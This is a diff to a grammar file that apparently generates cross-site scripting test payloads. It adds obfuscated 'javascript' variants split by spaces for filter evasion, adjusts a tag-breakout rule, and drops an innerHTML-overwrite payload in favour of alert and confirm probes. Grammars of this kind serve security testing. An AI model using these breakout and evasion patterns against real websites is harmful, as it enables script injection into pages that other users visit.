@@ -11,7 +11,7 @@ attack :=
 outbreak := 
 	+quote+,+bracket_gt+
 	+bracket_lt+,/,+tag_html+,+bracket_gt+
-	+outbreak++bracket_lt+,/,+tag_html+,+bracket_gt+
+	+outbreak+,+bracket_lt+,/,+tag_html+,+bracket_gt+
 	+bracket_lt+,img,+,+quote+,+quote+,+quote+,+bracket_gt+
 
 attacks_js :=
@@ -169,10 +169,12 @@ tag_html :=
 	var
 	video
 	wbr
-
+	
 tag_js :=
-	script
-
+	javascript
+	jav+space+ascript
+	javas+space+cript
+	
 event :=
 	onclick
 	oncontextmenu
@@ -271,7 +273,6 @@ bracket_lt :=
 	60
 	
 payload_attack :=
-	document.body.innerHTML,=,\,+quote+,+payload_text+,\,+quote+
 	alert,(,+quote+,+payload_text+,+quote+,)
 	promt,(,+quote+,+payload_text+,+quote+,)
 	confirm,(,+quote+,+payload_text+,+quote+,)
